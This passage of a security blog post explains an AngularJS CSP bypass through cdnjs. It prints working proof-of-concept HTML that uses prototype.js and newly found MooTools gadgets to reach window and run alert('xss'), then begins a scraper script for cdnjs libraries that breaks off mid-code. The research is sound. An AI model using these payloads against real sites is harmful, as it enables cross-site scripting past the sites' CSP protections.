<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>Who pollutes your prototype? Find the libs on cdnjs in an automated way - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2022/09/01/angularjs-csp-bypass-cdnjs/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/">
    





    <meta name="description" content="When it comes to CSP bypass, a kind of technique using AngularJS is well-known. One of it’s variant requires another library called Prototype.js to make it works. After understanding how it works, I">
<meta property="og:type" content="article">
<meta property="og:title" content="Who pollutes your prototype? Find the libs on cdnjs in an automated way">
<meta property="og:url" content="https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="When it comes to CSP bypass, a kind of technique using AngularJS is well-known. One of it’s variant requires another library called Prototype.js to make it works. After understanding how it works, I">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/angularjs-csp-bypass-cdnjs/cover-en.png">
<meta property="article:published_time" content="2022-09-01T11:31:10.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.897Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/angularjs-csp-bypass-cdnjs/cover-en.png">



<link rel="alternative" href="/atom.xml" title="Who pollutes your prototype? Find the libs on cdnjs in an automated way" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#cdnjs-angularjs-csp-bypass">1&nbsp;&nbsp;<b>cdnjs + AngularJS CSP bypass</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#manually-find-alternatives-mootools">2&nbsp;&nbsp;<b>Manually find alternatives - MooTools</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#find-the-replacement-in-an-automated-way">3&nbsp;&nbsp;<b>Find the replacement in an automated way</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#find-all-libraries-on-cdnjs">4&nbsp;&nbsp;<b>Find all libraries on cdnjs</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#find-all-js-files-for-each-library">4.1&nbsp;&nbsp;Find all JS files for each library</a>
                    
                    
                    
                    <a class="navbar-item" href="#find-the-libraries-we-want">4.2&nbsp;&nbsp;Find the libraries we want</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#result">5&nbsp;&nbsp;<b>Result</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#conclusion">6&nbsp;&nbsp;<b>Conclusion</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/09/01/angularjs-csp-bypass-cdnjs/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Who pollutes your prototype? Find the libs on cdnjs in an automated way
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-09-01T11:31:10.000Z" itemprop="datePublished">1 September 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <img src="/img/angularjs-csp-bypass-cdnjs/cover-en.png" style="display:none">

<p>When it comes to CSP bypass, a kind of technique using AngularJS is well-known. One of it’s variant requires another library called <code>Prototype.js</code> to make it works.</p>
<p>After understanding how it works, I began to wonder if there are other libraries on cdnjs that can do similar things, so I started researching.</p>
<p>This article will start with the CSP bypass of cdnjs, talk about why prototype.js is needed, and then mention how I found its replacement on cdnjs.</p>
<span id="more"></span>

<h2><span id="cdnjs-angularjs-csp-bypass">cdnjs + AngularJS CSP bypass</span></h2><p>Putting <code>https://cdnjs.cloudflare.com</code> in the CSP is actually a very dangerous thing, because there is a way that many people know to bypass this CSP.</p>
<p>For details, please refer to these two articles:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22">H5SC Minichallenge 3: “Sh*t, it’s CSP!”</a></li>
</ol>
<p>The bypass is as follows:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSP bypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span>
      <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
      <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src https://cdnjs.cloudflare.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
      &#123;&#123;$on.curry.call().alert('xss')&#125;&#125;
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>I will explain how it works step by step.</p>
<p>First, because cdnjs is allowed in CSP, we can import any libraries hosting on cdn.js. Here we choose AngularJS so that we can use CSTI to inject the following HTML:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
  &#123;&#123;$on.curry.call().alert('xss')&#125;&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>What is <code>$on.curry.call()</code>? You can replace it with <code>window</code>, and you will find that it’s not working. This is because the expression of AngularJS is scoped in a local object, and you cannot directly access window or properties on window.</p>
<p>Another important thing is that CSP does not contain <code>unsafe-eval</code>, so you can’t directly do <code>constructor.constructor(&#39;alert(1)&#39;)()</code>.</p>
<p>As we can see from the result, <code>$on.curry.call()</code> seems to be equivalent to window, why is that? This is where prototype.js comes in handy, let’s take a look at some of its source code:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">curry</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arguments<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> __method <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">__method</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This function will be added to <code>Function.prototype</code>, and we can focus on the first line: <code>if (!arguments.length) return this;</code>, if there is no parameter, it will return <code>this</code> directly. </p>
<p>In JavaScript, if you use <code>call</code> or <code>apply</code> to call a function, the first parameter can specify the value of <code>this</code>, if not passed it will be the default value, in non-strict mode it is <code>window</code>.</p>
<p>This is why <code>$on.curry.call()</code> will be <code>window</code>, because <code>$on</code> is a function, so when <code>$on.curry.call()</code> is called without any parameters, <code>curry</code> function will return <code>this</code>, which is <code>window</code>, according to the conditional statement in the first line.</p>
<p>To summarize, the reason why AngularJS needs the help of prototype.js is because prototype.js:</p>
<ol>
<li>Provides a function that added to the prototype</li>
<li>And this function will return <code>this</code></li>
</ol>
<p>The first point is very important, because as mentioned earlier, there is no way to access the <code>window</code> in the expression, but prototype.js puts things on the prototype, so it can be accessed through prototype.</p>
<p>The second point is also very important. We can access <code>window</code> because <code>this</code> is <code>window</code> by default when calling a function via <code>.call()</code> without providing <code>thisArg</code>.</p>
<p>After knowing how this works, you should know how to find a replacement, as long as you find one with the same function structure. </p>
<p>I suddenly thought of an article I wrote before: <a href="https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/">Don’t break the Web: Take SmooshGate and keygen as examples</a>, in which I mentioned that because MooTools is used to adding new things to the prototype, the method originally called <code>flatten</code> had to be renamed <code>flat</code>.</p>
<p>Will MooTools also meet our above conditions?</p>
<h2><span id="manually-find-alternatives-mootools">Manually find alternatives - MooTools</span></h2><p>We can find various prototypes modified by MooTools in this folder: <a target="_blank" rel="noopener" href="https://github.com/mootools/mootools-core/tree/master/Source/Types">https://github.com/mootools/mootools-core/tree/master/Source/Types</a></p>
<ol>
<li>Array</li>
<li>DOMEvent</li>
<li>Function</li>
<li>Number</li>
<li>Object</li>
<li>String</li>
</ol>
<p>Because the files are not large, you can read them one by one. If you want to be faster, you can also use <code>return this</code> as a keyword to search, and you can find two as soon as you search:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Array<span class="token punctuation">.</span><span class="token function">implement</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token function-variable function">erase</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> item<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>

  <span class="token function-variable function">empty</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>Both <code>Array.prototype.erase</code> and <code>Array.prototype.empty</code> functions return <code>this</code>, so the following two methods can get the <code>window</code>:</p>
<ol>
<li>[].erase.call()</li>
<li>[].empty.call()</li>
</ol>
<p>Then try it immediately to see if the CSP bypass is successful:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSP bypass - MooTools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span>
      <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
      <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src https://cdnjs.cloudflare.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
      &#123;&#123;[].erase.call().alert('xss')&#125;&#125;
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After opening the file, the alert pop up! The bypass works.</p>
<p>It’s time to think about how to automate it.</p>
<h2><span id="find-the-replacement-in-an-automated-way">Find the replacement in an automated way</span></h2><p>A simple and intuitive automated process is probably:</p>
<ol>
<li>Find all libraries on cdnjs</li>
<li>Find all JS files for each library</li>
<li>Use a headless browser (I use puppeteer) to test whether each JS adds a new property to the prototype</li>
<li>Try to call the new property to see if it will return window</li>
</ol>
<p>Some of the details depend on how you want to deal with it. For example, if you want to be more precisely, you can test all versions of the library, but in that case, the amount of testing may increase by five to ten times.</p>
<p>I don’t want to spent too much time on it, so I will use the latest version only.</p>
<p>In addition to finding a method that can return <code>this</code>, I also want to see which libraries will modidy your prototype, which can be known from the results of the third step.</p>
<h2><span id="find-all-libraries-on-cdnjs">Find all libraries on cdnjs</span></h2><p>I went to the cdnjs website to see how it works, I found that it called the API in algolia to fetch the list of libraries. Algolia provides a method to pull back all the data, but the api key of the official website does not support it, and paging is limited, only returns the first 1000 results.</p>
<p>So, I found the search API, assuming that there are no more than 1000 libraries starting with each letter, I can search for the libraries starting with each letter from <code>a-zA-Z0-9</code>, thereby bypassing the 1000 limitation.</p>
<p>The implementation of the code looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'axios'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token constant">API_HOST</span> <span class="token operator">=</span> <span class="token string">'https://2qwlvlxzb6-dsn.algolia.net/'</span>
<span class="token keyword">const</span> <span class="token constant">SEARCH_API_URL</span> <span class="token operator">=</span> <span class="token string">'/1/indexes/libraries/query'</span>
<span class="token keyword">const</span> <span class="token constant">API_KEY</span> <span class="token operator">=</span> <span class="token string">'2663c73014d2e4d6d1778cc8ad9fd010'</span>
<span class="token keyword">const</span> <span class="token constant">APP_ID</span> <span class="token operator">=</span> <span class="token string">'2QWLVLXZB6'</span>

<span class="token keyword">const</span> instance <span class="token operator">=</span> axios<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">baseURL</span><span class="token operator">:</span> <span class="token constant">API_HOST</span><span class="token punctuation">,</span>
  <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">'x-algolia-api-key'</span><span class="token operator">:</span> <span class="token constant">API_KEY</span><span class="token punctuation">,</span>
    <span class="token string-property property">'x-algolia-application-id'</span><span class="token operator">:</span> <span class="token constant">APP_ID</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libs.json'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> chars <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">let</span> allItems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">let</span> existLib <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">fetching </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
      <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getLibraries</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>
      <span class="token keyword">const</span> hits <span class="token operator">=</span> data<span class="token punctuation">.</span>hits
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span> hits<span class="token punctuation">.</span>length<span class="token punctuation">)</span>

      <span class="token keyword">const</span> filtered <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> hits<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>existLib<span class="token punctuation">[</span>item<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          filtered<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
        existLib<span class="token punctuation">[</span>item<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
      <span class="token punctuation">&#125;</span>
      allItems <span class="token operator">=</span> allItems<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>filtered<span class="token punctuation">)</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'filtered length:'</span><span class="token punctuation">,</span> filtered<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'total length:'</span><span class="token punctuation">,</span> allItems<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
      <span class="token function">write</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>allItems<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error!'</span><span class="token punctuation">)</span>
